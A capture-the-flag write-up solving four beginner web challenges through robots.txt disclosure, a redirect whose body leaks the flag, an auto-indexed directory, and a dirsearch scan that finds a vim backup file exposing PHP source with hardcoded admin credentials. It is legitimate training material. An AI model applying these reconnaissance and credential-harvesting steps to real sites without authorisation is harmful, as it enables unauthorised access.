# Beginner-Web Challenges

### Robots

https://web2.chujowyc.tf/

Go to https://web2.chujowyc.tf/robots.txt and you will see the following:

```
User-agent: *
Disallow: index.php
Disallow: CQy2Z1k3J7ku7uhQ8uNTagIeLvYg1noA2f4v
```

Your flag is located at https://web2.chujowyc.tf/CQy2Z1k3J7ku7uhQ8uNTagIeLvYg1noA2f4v

> chCTF{r08075_7X7_l33k5_A_l07_0f_1nf0rmA710N}

### The Return of Insanity1

https://web4.chujowyc.tf/

When you go here you notice the link takes you to https://web4.chujowyc.tf/flag.php but you are immediately redirected to https://web4.chujowyc.tf/construct.php. What happens if you get _just_ flag.php?

```html
cj [master●●] % http https://web4.chujowyc.tf/flag.php
HTTP/1.1 302 Found
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Thu, 16 Jul 2020 03:49:25 GMT
Location: /construct.php
Server: openresty/1.15.8.2
Strict-Transport-Security: max-age=15724800
Transfer-Encoding: chunked

<html>
    <body>
        chCTF{4nd_Y0U_7H0u9H7_1n54N17y1_w45_4_U53l355_745k}    </body>
</html>
```

> chCTF{4nd_Y0U_7H0u9H7_1n54N17y1_w45_4_U53l355_745k}

### Deployment

https://web1.chujowyc.tf/

View page source:

```html
<html>
    <body>
        <h1> Look at this cute furry OwO </h1>
        <img src="/files/furry.jpg">
    </body>
</html>
```

Go to the base of the `files` directory: https://web1.chujowyc.tf/files/. Your flag is here: view-source:https://web1.chujowyc.tf/files/flag

> chCTF{4U7o1Nd3x_15_b444d}

### Vim

The challenge has a tag indicating that this is a PHP related challenge. Lets find PHP files then:

```
cj [master●●] % dirsearch -u https://web3.chujowyc.tf/ -e html,php,js,css,txt &> dirout.txt
cj [master●●] % cat dirout.txt| grep 200
[21:00:22] 403 -  548B  - /admin/.config
[21:00:35] 403 -  548B  - /administrator/.htaccess
[21:01:29] 200 -  612B  - /index.html
[21:01:30] 200 -  342B  - /index.php
[21:01:30] 200 -  803B  - /index.php~
```

https://web3.chujowyc.tf/index.php~

```
<html>
    <body>
        <h1> This site was created using vim on production! </h1>

        <?php
        include("flag.php");
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            if ($_POST["name"] == "admin" && $_POST["password"] == "PE1qhr81JP/9YYkci/JVs7y2ShnlVZtGSN6qDxvUSQiB7WRo6qPtcm6gb5gzQ65JaI62i0x474ri") {
                echo($flag);
            } else {
                echo("Try harder :P");
            }
        } else if ($_SERVER['REQUEST_METHOD'] === 'GET') {

            echo("
             <form action=\"/\" method=\"post\">
            Username: <input type=\"text\" name=\"name\"><br>
            Password: <input type=\"text\" name=\"password\" password><br>
            <input type=\"submit\">
            </form>");
            }
        ?>

    </body>
</html>

```

Login using the following:

username: admin
password: PE1qhr81JP/9YYkci/JVs7y2ShnlVZtGSN6qDxvUSQiB7WRo6qPtcm6gb5gzQ65JaI62i0x474ri

> chCTF{D0Nt_d3V3l0p_0n_4_Pr0duCtI0N_s3RV3r}    